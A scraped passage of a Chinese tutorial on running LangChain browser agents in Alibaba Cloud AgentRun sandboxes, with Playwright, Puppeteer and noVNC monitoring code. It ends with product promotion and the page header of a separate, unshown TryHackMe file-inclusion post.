<pre><code class="hljs language-typescript" lang="typescript">python main.<span class="hljs-property">py</span>
</code></pre>
<p>程序会自动：</p>
<ol>
<li>创建 Browser Sandbox</li>
<li>打开 VNC 查看器（实时查看浏览器操作）</li>
<li>执行预设查询</li>
<li>进入交互模式</li>
</ol>
<h4 data-id="heading-20">工作原理</h4>
<p>为了更好地理解系统架构，我们将工作流程拆分为两个部分：<strong>LangChain Agent 工作流程</strong>和 <strong>SandboxManager 生命周期管理</strong>。</p>
<h5 data-id="heading-21">1. LangChain Agent 工作流程</h5>
<p>下图展示了 LangChain Agent 如何处理用户请求并调用相应的 Tools：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    Start([用户发起请求&lt;br/&gt;例: 访问网页并截图]) --&gt; Agent[LangChain Agent&lt;br/&gt;分析用户意图]
    
    Agent --&gt; SelectTool{选择合适的 Tool}
    
    SelectTool --&gt;|首次使用| Tool1[create_browser_sandbox]
    SelectTool --&gt;|导航网页| Tool2[navigate_to_url]
    SelectTool --&gt;|截取屏幕| Tool3[take_screenshot]
    SelectTool --&gt;|查询状态| Tool4[get_sandbox_info]
    SelectTool --&gt;|清理资源| Tool5[destroy_sandbox]
    
    Tool1 --&gt; CallManager1[调用 SandboxManager]
    Tool2 --&gt; CallManager2[调用 SandboxManager]
    Tool3 --&gt; CallManager3[调用 SandboxManager]
    Tool4 --&gt; CallManager4[调用 SandboxManager]
    Tool5 --&gt; CallManager5[调用 SandboxManager]
    
    CallManager1 --&gt; Manager[SandboxManager&lt;br/&gt;单例实例]
    CallManager2 --&gt; Manager
    CallManager3 --&gt; Manager
    CallManager4 --&gt; Manager
    CallManager5 --&gt; Manager
    
    Manager --&gt; ToolResult[Tool 返回结果]
    ToolResult --&gt; AgentProcess[Agent 处理结果&lt;br/&gt;生成响应]
    AgentProcess --&gt; Response([返回用户友好的响应])
    
    Response -.多轮对话.-&gt; Start
    
    style Agent fill:#667eea,color:#fff
    style Manager fill:#764ba2,color:#fff
    style Tool1 fill:#4ecdc4,color:#fff
    style Tool2 fill:#4ecdc4,color:#fff
    style Tool3 fill:#4ecdc4,color:#fff
    style Tool4 fill:#4ecdc4,color:#fff
    style Tool5 fill:#4ecdc4,color:#fff
</code></pre>
<p><strong>Agent 工作流程说明：</strong></p>
<ol>
<li><strong>请求接收</strong>：用户发起自然语言请求（如"访问淘宝首页并截图"）</li>
<li><strong>意图分析</strong>：Agent 分析用户意图，决定需要调用哪些 Tools</li>
<li><strong>Tool 调用</strong>：根据任务需求，顺序或组合调用多个 Tools</li>
<li><strong>Manager 交互</strong>：所有 Tools 都通过 SandboxManager 单例实例操作 Sandbox</li>
<li><strong>结果处理</strong>：Agent 将 Tool 返回的结果整合成用户友好的响应</li>
<li><strong>多轮对话</strong>：Sandbox 在整个会话中保持活跃，支持多轮对话</li>
</ol>
<p><strong>5 个核心 Tools 的职责：</strong></p>



































<table><thead><tr><th>Tool</th><th>功能</th><th>使用场景</th></tr></thead><tbody><tr><td><code>create_browser_sandbox</code></td><td>创建 Sandbox 实例</td><td>首次使用或 Sandbox 已销毁时</td></tr><tr><td><code>navigate_to_url</code></td><td>导航到指定 URL</td><td>需要访问网页时</td></tr><tr><td><code>take_screenshot</code></td><td>截取当前页面</td><td>需要保存页面快照时</td></tr><tr><td><code>get_sandbox_info</code></td><td>获取 Sandbox 信息</td><td>查看状态或获取 VNC URL 时</td></tr><tr><td><code>destroy_sandbox</code></td><td>销毁 Sandbox 实例</td><td>任务完成或需要释放资源时</td></tr></tbody></table>
<h5 data-id="heading-22">2. SandboxManager 生命周期管理</h5>
<p>下图展示了 SandboxManager 如何管理 Sandbox 的完整生命周期：</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/svg/132256418/1767589910006-102dcf23-d720-44b7-9907-b32509a77adb.svg" alt="" loading="lazy"/></p>
<p><strong>SandboxManager 工作流程说明：</strong></p>
<ol>
<li><strong>单例管理</strong>：
<ul>
<li>首次调用时创建 Manager 实例</li>
<li>后续调用复用同一个实例</li>
<li>确保整个会话只有一个 Sandbox</li>
</ul>
</li>
<li><strong>Sandbox 创建</strong>：
<ul>
<li>调用 AgentRun SDK 的 Sandbox.create()</li>
<li>SDK 通过阿里云 API 与函数计算 FC 通信</li>
<li>FC 服务创建独立的容器实例，包含：
<ul>
<li>Chromium 浏览器VNC 服务必要的运行环境</li>
</ul>
</li>
</ul>
</li>
<li><strong>连接信息获取</strong>：
<ul>
<li><strong>CDP URL</strong>：WebSocket 地址，用于 Playwright/Puppeteer 远程控制浏览器</li>
<li><strong>VNC URL</strong>：WebSocket 地址，用于实时查看浏览器画面</li>
</ul>
</li>
<li><strong>浏览器操作</strong>：
<ul>
<li>Playwright 通过 CDP URL 连接到远程浏览器</li>
<li>执行各种浏览器操作（导航、点击、截图等）</li>
<li>VNC 同步显示操作过程，用户可实时监控</li>
</ul>
</li>
<li><strong>资源清理</strong>：
<ul>
<li>调用 destroy() 方法销毁 Sandbox</li>
<li>清理 Manager 内部状态</li>
<li>通过 SDK 释放云端资源</li>
</ul>
</li>
</ol>
<h5 data-id="heading-23">3. Agent 与 Manager 的协作关系</h5>
<p><strong>交互模式：</strong></p>
<pre><code class="hljs language-latex" lang="latex">用户请求 → Agent → Tool → SandboxManager → AgentRun SDK → 云端 Sandbox
                                    ↓
用户响应 ← Agent ← Tool ← SandboxManager ← 操作结果
</code></pre>
<p><strong>关键设计理念：</strong></p>
<ol>
<li><strong>分层架构</strong>：
<ul>
<li><strong>用户层</strong>：自然语言交互</li>
<li><strong>Agent 层</strong>：意图理解和任务分解</li>
<li><strong>Tool 层</strong>：功能封装和参数验证</li>
<li><strong>Manager 层</strong>：资源管理和状态维护</li>
<li><strong>SDK 层</strong>：云服务通信</li>
<li><strong>云端层</strong>：实际的 Sandbox 环境</li>
</ul>
</li>
<li><strong>单例模式</strong>：
<ul>
<li>SandboxManager 使用单例模式</li>
<li>保证整个会话中只有一个 Sandbox 实例</li>
<li>避免资源浪费和状态冲突</li>
</ul>
</li>
<li><strong>状态复用</strong>：
<ul>
<li>Sandbox 在多轮对话中保持活跃</li>
<li>减少创建和销毁的开销</li>
<li>提供更流畅的用户体验</li>
</ul>
</li>
<li><strong>双通道设计</strong>：
<ul>
<li><strong>CDP 通道</strong>：Agent 通过 Playwright 控制浏览器</li>
<li><strong>VNC 通道</strong>：用户通过 VNC 查看器实时监控</li>
</ul>
</li>
<li><strong>解耦设计</strong>：
<ul>
<li>Tools 不直接操作 SDK，通过 Manager 统一管理</li>
<li>便于扩展和维护</li>
<li>统一的错误处理和资源管理</li>
</ul>
</li>
</ol>
<p><strong>典型使用场景示例：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"># 第 <span class="hljs-number">1</span> 轮对话
用户: <span class="hljs-string">"创建一个 sandbox 并访问淘宝首页"</span>
→ <span class="hljs-title class_">Agent</span> 调用: create_browser_sandbox → navigate_to_url
→ <span class="hljs-title class_">Manager</span>: 创建 <span class="hljs-title class_">Sandbox</span> → <span class="hljs-title class_">Playwright</span> 导航
→ 结果: <span class="hljs-string">"Sandbox 已创建，已访问淘宝首页"</span>

# 第 <span class="hljs-number">2</span> 轮对话（复用 <span class="hljs-title class_">Sandbox</span>）
用户: <span class="hljs-string">"截取当前页面"</span>
→ <span class="hljs-title class_">Agent</span> 调用: take_screenshot
→ <span class="hljs-title class_">Manager</span>: 使用现有 <span class="hljs-title class_">Sandbox</span> → <span class="hljs-title class_">Playwright</span> 截图
→ 结果: <span class="hljs-string">"截图已保存"</span>

# 第 <span class="hljs-number">3</span> 轮对话（复用 <span class="hljs-title class_">Sandbox</span>）
用户: <span class="hljs-string">"访问京东首页"</span>
→ <span class="hljs-title class_">Agent</span> 调用: navigate_to_url
→ <span class="hljs-title class_">Manager</span>: 使用现有 <span class="hljs-title class_">Sandbox</span> → <span class="hljs-title class_">Playwright</span> 导航
→ 结果: <span class="hljs-string">"已访问京东首页"</span>
</code></pre>
<p>通过这种设计，Agent 专注于理解用户意图和任务编排，而 Manager 专注于 Sandbox 的生命周期管理，实现了清晰的职责分离。</p>
<p><strong>工作原理总结：</strong></p>
<ol>
<li><strong>工具注册</strong>: 使用 <code>@tool</code> 装饰器将 Sandbox 功能封装为 LangChain tools</li>
<li><strong>生命周期管理</strong>: <code>SandboxManager</code> 负责 Sandbox 的创建、管理和销毁</li>
<li><strong>状态保持</strong>: 使用单例模式管理 Sandbox 实例，确保同一会话内复用</li>
<li><strong>VNC 集成</strong>: 自动获取并返回 VNC URL，方便用户实时查看</li>
<li><strong>错误处理</strong>: 所有工具都包含完善的错误处理机制</li>
</ol>
<h4 data-id="heading-24">扩展和定制</h4>
<p><strong>添加自定义 Tools：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">extract_table_data</span>(<span class="hljs-attr">url</span>: str) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"从网页中提取表格数据"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
    
    manager = <span class="hljs-title function_">get_sandbox_manager</span>()
    cdp_url = manager.<span class="hljs-title function_">get_info</span>()[<span class="hljs-string">'cdp_url'</span>]
    
    <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
        browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
        page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
        page.<span class="hljs-title function_">goto</span>(url)
        tables = page.<span class="hljs-title function_">query_selector_all</span>(<span class="hljs-string">"table"</span>)
        <span class="hljs-keyword">return</span> f<span class="hljs-string">"找到 {len(tables)} 个表格"</span>
</code></pre>
<p><strong>自定义提示词：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript">custom_prompt = <span class="hljs-string">""</span><span class="hljs-string">"你是一个专业的网页数据提取助手。
在执行任务前，请先创建 sandbox，然后使用浏览器工具完成任务。"</span><span class="hljs-string">""</span>

agent = <span class="hljs-title function_">create_browser_agent</span>(system_prompt=custom_prompt)
</code></pre>
<h4 data-id="heading-25">最佳实践</h4>
<ol>
<li><strong>模块化设计</strong>: 将 Sandbox 管理和 Agent 创建分离，提高代码可维护性</li>
<li><strong>错误处理</strong>: 所有工具都应包含完善的错误处理</li>
<li><strong>资源清理</strong>: 使用信号处理器确保资源正确清理</li>
<li><strong>VNC 提示</strong>: 在工具返回中包含 VNC URL，方便用户使用</li>
<li><strong>单例模式</strong>: 确保 Sandbox 实例在会话中复用，避免重复创建</li>
</ol>
<h2 data-id="heading-26">前端集成可视化监控（VNC）</h2>
<h3 data-id="heading-27">VNC 集成架构</h3>
<p>下图展示了前端如何集成 VNC 实现实时监控：</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/__mermaid_v3/b8d70d84485d4871126222501c457254.svg" alt="" loading="lazy"/></p>
<h3 data-id="heading-28">轻量级 HTML 页面集成</h3>
<p>创建一个简单的 <code>vnc-viewer.html</code> 文件：</p>
<pre><code class="hljs language-typescript" lang="typescript">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Browser Sandbox VNC 查看器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>; }
        <span class="hljs-selector-id">#vnc-container</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"vnc-container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
        <span class="hljs-keyword">const</span> vncUrl = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);
        
        <span class="hljs-keyword">if</span> (!vncUrl) {
            <span class="hljs-title function_">alert</span>(<span class="hljs-string">'请提供 VNC URL 参数'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
            
            <span class="hljs-keyword">const</span> rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'vnc-container'</span>),
                vncUrl,
                { <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> } }
            );
            
            rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>使用方式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>

vnc_url = sandbox.<span class="hljs-property">vnc_url</span>
encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
viewer_url = f<span class="hljs-string">"file:///path/to/vnc-viewer.html?url={encoded_url}"</span>
webbrowser.<span class="hljs-title function_">open</span>(viewer_url)
</code></pre>
<h3 data-id="heading-29">React 应用集成</h3>
<p><strong>核心组件代码</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">VNCViewerProps</span> {
  <span class="hljs-attr">vncUrl</span>: <span class="hljs-built_in">string</span>;
  onConnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  onDisconnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">VNCViewer</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">VNCViewerProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ 
  vncUrl, 
  onConnect, 
  onDisconnect 
}</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> containerRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">rfb</span>: <span class="hljs-built_in">any</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">initVNC</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!containerRef.<span class="hljs-property">current</span> || !vncUrl) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> { <span class="hljs-attr">default</span>: <span class="hljs-variable constant_">RFB</span> } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@novnc/novnc/core/rfb'</span>);

      rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(containerRef.<span class="hljs-property">current</span>, vncUrl, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
      });

      rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;

      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> onConnect?.());
      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'disconnect'</span>, <span class="hljs-function">() =&gt;</span> onDisconnect?.());
    };

    <span class="hljs-title function_">initVNC</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (rfb) rfb.<span class="hljs-title function_">disconnect</span>();
    };
  }, [vncUrl, onConnect, onDisconnect]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
      <span class="hljs-attr">ref</span>=<span class="hljs-string">{containerRef}</span> 
      <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">height:</span> '<span class="hljs-attr">600px</span>', <span class="hljs-attr">background:</span> '#<span class="hljs-attr">000</span>' }} 
    /&gt;</span></span>
  );
};
</code></pre>
<p>使用示例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">VNCViewer</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./VNCViewer'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [vncUrl, setVncUrl] = useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/sandbox/create'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span> })
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setVncUrl</span>(data.<span class="hljs-property">vnc_url</span>));
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Browser Sandbox 实时监控<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {vncUrl ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">VNCViewer</span> 
          <span class="hljs-attr">vncUrl</span>=<span class="hljs-string">{vncUrl}</span>
          <span class="hljs-attr">onConnect</span>=<span class="hljs-string">{()</span> =&gt;</span> console.log('已连接')}
          onDisconnect={() =&gt; console.log('已断开')}
        /&gt;
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>正在初始化...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<blockquote>
<p><strong>完整示例代码</strong>：包含完整前端集成示例和后端 API 的代码请访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faliyun%2Fagentrun-sandbox-demo" target="_blank" title="https://github.com/aliyun/agentrun-sandbox-demo" ref="nofollow noopener noreferrer">GitHub 仓库</a>。</p>
</blockquote>
<h2 data-id="heading-30">Puppeteer 和 Playwright 直接集成</h2>
<p>如果您更熟悉传统的浏览器自动化库,也可以直接使用 Puppeteer 或 Playwright 连接到 Browser Sandbox。</p>
<h3 data-id="heading-31">使用 Playwright</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
<span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>

# 创建 <span class="hljs-title class_">Sandbox</span>
sandbox = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
    template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">3000</span>
)

# 使用 <span class="hljs-title class_">Playwright</span> 连接
<span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
    browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(sandbox.<span class="hljs-property">cdp_url</span>)
    page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
    
    # 执行操作
    page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">"https://www.example.com"</span>)
    page.<span class="hljs-title function_">screenshot</span>(path=<span class="hljs-string">"screenshot.png"</span>)
    content = page.<span class="hljs-title function_">content</span>()
    
    browser.<span class="hljs-title function_">close</span>()

# 清理
sandbox.<span class="hljs-title function_">delete</span>()
</code></pre>
<h3 data-id="heading-32">使用 Puppeteer（Node.js）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer-core'</span>);

<span class="hljs-comment">// CDP URL 从 Sandbox 获取</span>
<span class="hljs-keyword">const</span> cdpUrl = <span class="hljs-string">'wss://your-account.funagent-data-pre.cn-hangzhou.aliyuncs.com/sandboxes/xxx/ws/automation'</span>;

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">connect</span>({
    <span class="hljs-attr">browserWSEndpoint</span>: cdpUrl,
    <span class="hljs-attr">defaultViewport</span>: <span class="hljs-literal">null</span>
  });

  <span class="hljs-keyword">const</span> page = (<span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">pages</span>())[<span class="hljs-number">0</span>];

  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">'https://www.example.com'</span>);
  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">screenshot</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'screenshot.png'</span> });

  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();
})();
</code></pre>
<h2 data-id="heading-33">总结</h2>
<p>通过本教程，您已经学会了：</p>
<ol>
<li><strong>AgentRun SDK 基础</strong>: 如何使用 SDK 创建和管理 Browser Sandbox</li>
<li><strong>LangChain 集成</strong>: 如何将 Sandbox 封装为 LangChain Tools</li>
<li><strong>VNC 可视化</strong>: 如何在前端集成 VNC 实现实时监控</li>
<li><strong>直接集成</strong>: 如何使用 Puppeteer/Playwright 直接连接 Sandbox</li>
</ol>
<h2 data-id="heading-34">快速了解函数计算 AgentRun：</h2>
<p><strong>​一句话介绍：​</strong>函数计算 AgentRun 是一个以高代码为核心的一站式 Agentic AI 基础设施平台。秉持生态开放和灵活组装的理念，为企业级 Agent 应用提供从开发、部署到运维的全生命周期管理。</p>
<p><img src="https://img.alicdn.com/imgextra/i3/O1CN01OUeOeM1uz3stEqJ1Q_!!6000000006107-2-tps-3840-2120.png" alt="" loading="lazy"/></p>
<p>函数计算 AgentRun 架构图</p>
<p>AgentRun 运行时基于阿里云函数计算 FC 构建，继承了 Serverless 计算极致弹性、按量付费、零运维的核心优势。通过深度集成 AgentScope、Langchain、RAGFlow、Mem0 等主流开源生态。AgentRun 将 Serverless 的极致弹性、零运维和按量付费的特性与 AI 原生应用场景深度融合，助力企业实现成本与效率的极致优化，<strong>平均 TCO 降低 60%</strong>。</p>
<p><strong>​让​开发者只需专注于 Agent 的业务逻辑创新，无需关心底层基础设施，让 Agentic AI 真正进入企业生产环境。</strong></p>
<p>欢迎加入“函数计算 AgentRun 客户群”与我们交流，钉钉群号：134570017218。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【TryHackMe】JPT-文件包含]]></title>    <link>https://juejin.cn/post/7592610104442650634</link>    <guid>https://juejin.cn/post/7592610104442650634</guid>    <pubDate>2026-01-08T08:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104442650634" data-draft-id="7592559120118464558" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【TryHackMe】JPT-文件包含"/> <meta itemprop="keywords" content="安全"/> <meta itemprop="datePublished" content="2026-01-08T08:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户196533067211"/> <meta itemprop="url" content="https://juejin.cn/user/3194510624432521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【TryHackMe】JPT-文件包含
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3194510624432521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户196533067211
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:51:51.000Z" title="Thu Jan 08 2026 08:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
